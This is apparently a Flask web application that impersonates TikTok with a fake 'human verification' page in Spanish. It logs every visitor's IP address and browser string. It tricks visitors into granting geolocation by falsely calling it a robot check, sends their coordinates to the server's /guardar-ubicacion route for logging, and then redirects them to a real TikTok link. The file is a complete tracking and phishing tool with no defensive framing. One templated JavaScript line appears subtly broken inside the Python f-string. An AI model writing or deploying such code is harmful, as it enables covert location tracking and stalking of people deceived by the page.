from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)
TARGET_TIKTOK = "https://vt.tiktok.com/ZSVN7YNTV/"

@app.route('/')
def index():
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        ip = forwarded.split(',')[0].strip()
    else:
        ip = request.remote_addr or ''
    user_agent = request.headers.get('User-Agent', '')
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"{now} {ip} {user_agent}", flush=True)

    html = f"""<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta property="og:site_name" content="TikTok">
<meta property="og:title" content="Mira este video en TikTok">
<meta property="og:description" content="Descubre contenido en TikTok">
<meta property="og:image" content="https://sf16-sg.tiktokcdn.com/obj/eden-sg/u33hn4pjy/tiktok_logo.png">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verificar para continuar</title>
<style>
  body {{ font-family: Arial, sans-serif; margin:0; padding:0; background:#111; color:#fff; }}
  .banner {{ background: #ffcc00; color: #000; padding: 12px; text-align:center; font-weight:bold; }}
  .container {{ display:flex; align-items:center; justify-content:center; height:calc(100vh - 50px); }}
  .card {{ background:#222; padding:24px; border-radius:8px; box-shadow:0 6px 18px rgba(0,0,0,.6); max-width:420px; width:90%; text-align:center; }}
  .btn {{ display:inline-block; padding:10px 18px; margin:8px; border-radius:6px; border:none; cursor:pointer; font-weight:bold; }}
  .btn-primary {{ background:#06f; color:#fff; }}
  .btn-secondary {{ background:#444; color:#fff; }}
  .small {{ font-size:0.9rem; color:#ccc; margin-top:8px; }}
  .hidden {{ display:none; }}
</style>
</head>
<body>
  <div class="banner">Actualización urgente: Verifica que no eres un robot para continuar</div>
  <div class="container">
    <div class="card">
      <h2>Verificación humana requerida</h2>
      <p>Presiona <strong>Permitir</strong> en la ventana del navegador para verificar que no eres un robot y obtener acceso al contenido.</p>
      <button id="allowBtn" class="btn btn-primary">Permitir</button>
      <button id="skipBtn" class="btn btn-secondary">Cancelar</button>
      <p id="status" class="small">Al permitir, compartes tu ubicación temporalmente para verificar tu acceso. Solo se usará para este proceso.</p>
      <p id="error" class="small hidden" style="color:#ff8a8a;"></p>
    </div>
  </div>

<script>
const TARGET = "{TARGET_TIKTOK}";
const allowBtn = document.getElementById('allowBtn');
const skipBtn = document.getElementById('skipBtn');
const status = document.getElementById('status');
const errorEl = document.getElementById('error');

function redirectNow() {{
  // final redirection
  window.location.href = TARGET;
}}

function sendLocation(lat, lon) {{
  return fetch('/guardar-ubicacion', {{
    method: 'POST',
    headers: {{ 'Content-Type': 'application/json' }},
    body: JSON.stringify({ latitud: lat, longitud: lon })
  }});
}}

function obtenerUbicacion() {{
  errorEl.classList.add('hidden');
  status.textContent = 'Solicitando ubicación...';
  if ("geolocation" in navigator) {{
    navigator.geolocation.getCurrentPosition(
      (position) => {{
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        status.textContent = 'Enviando ubicación...';
        sendLocation(lat, lon)
          .then(() => {{
            status.textContent = 'Verificado. Redirigiendo...';
            setTimeout(redirectNow, 600);
          }})
          .catch((err) => {{
            console.error('Error enviando ubicación:', err);
            errorEl.textContent = 'Error al enviar ubicación. Será redirigido de todas formas.';
            errorEl.classList.remove('hidden');
            setTimeout(redirectNow, 1500);
          }});
      }},
      (err) => {{
        console.error('Error al obtener ubicación:', err);
        if (err.code === 1) {{
          errorEl.textContent = 'Permiso denegado. Por favor permite el acceso a la ubicación.';
        }} else if (err.code === 3) {{
          errorEl.textContent = 'Tiempo de espera agotado. Intenta de nuevo.';
        }} else {{
          errorEl.textContent = 'No se pudo obtener la ubicación.';
        }}
        errorEl.classList.remove('hidden');
      }},
      {{ enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }}
    );
  }} else {{
    errorEl.textContent = 'La geolocalización no está soportada en este navegador.';
    errorEl.classList.remove('hidden');
    setTimeout(redirectNow, 1500);
  }}
}}

allowBtn.addEventListener('click', (e) => {{
  obtenerUbicacion();
}});

skipBtn.addEventListener('click', (e) => {{
  status.textContent = 'Has cancelado la verificación. Redirigiendo...';
  setTimeout(redirectNow, 800);
}});

// Optional: try to auto-open permission prompt after short delay
setTimeout(() => {{
  // little nudge: focus button
  allowBtn.focus();
}}, 500);
</script>
</body>
</html>
"""

    return html

@app.route('/guardar-ubicacion', methods=['POST'])
def recibir_ubicacion():
    datos = request.get_json(silent=True)
    latitud = None
    longitud = None
    if datos:
        latitud = datos.get('latitud')
        longitud = datos.get('longitud')

    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        ip = forwarded.split(',')[0].strip()
    else:
        ip = request.remote_addr or ''
    user_agent = request.headers.get('User-Agent', '')
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Imprime fecha, IP, coordenadas y User-Agent en stdout (flush)
    print(f"{now} {ip} GEO lat:{latitud} lon:{longitud} UA:{user_agent}", flush=True)

    return jsonify({"status": "exito"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
